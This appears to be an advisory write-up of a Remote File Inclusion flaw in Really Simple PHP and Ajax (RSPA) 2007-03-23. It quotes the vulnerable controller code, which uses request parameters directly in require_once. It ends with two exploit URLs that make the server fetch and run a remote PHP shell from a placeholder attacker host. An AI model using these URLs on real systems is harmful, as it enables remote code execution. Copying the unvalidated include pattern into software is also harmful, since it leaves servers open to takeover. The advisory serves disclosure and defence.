### Summary
The provided content describes a Remote File Inclusion vulnerability in Really Simple PHP and Ajax (RSPA) version 2007-03-23.

### Root cause of vulnerability
The vulnerability is due to insufficient input validation of the `__IncludeFilePHPClass`, `__ClassPath`, and `__class` parameters in `rspa/framework/Controller_v5.php` and `rspa/framework/Controller_v4.php`.

### Weaknesses/vulnerabilities present
- Remote File Inclusion (RFI)

### Impact of exploitation
Successful exploitation allows attackers to execute arbitrary PHP code by including files from local or external resources.

### Attack vectors
The attack vector involves sending a crafted HTTP request with malicious URLs in the `__IncludeFilePHPClass` or `__ClassPath` parameters.

### Required attacker capabilities/position
The attacker needs to be able to send HTTP requests to the vulnerable RSPA application.

### Technical Details
The vulnerable code snippets are located in `rspa/framework/Controller_v5.php` and `rspa/framework/Controller_v4.php`:
```php
// IncludeFile for PHP Class
if ($_REQUEST['__IncludeFilePHPClass']){
    $filename = $_REQUEST['__IncludeFilePHPClass'];
    require_once ($filename);
}

// ClassFile + ClassPath
if ($_REQUEST["__ClassPath"]=="null" || empty($_REQUEST["__ClassPath"])){
    $filename = $RSPA['class_folder'].$className.$RSPA['class_extension'];
} else {
    $filename = $_REQUEST["__ClassPath"].$className.$RSPA['class_extension'];
}
require_once($filename);
```

### Exploitation example
The following URLs can be used to exploit the vulnerability:
```
http://[HOST]/rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://attacker/phpshell.txt/?
http://[HOST]/rspa/framework/Controller_v4.php?__ClassPath=http://attacker/phpshell.txt/?
```
These URLs will include and execute the PHP code located at `http://attacker/phpshell.txt`.
```
```
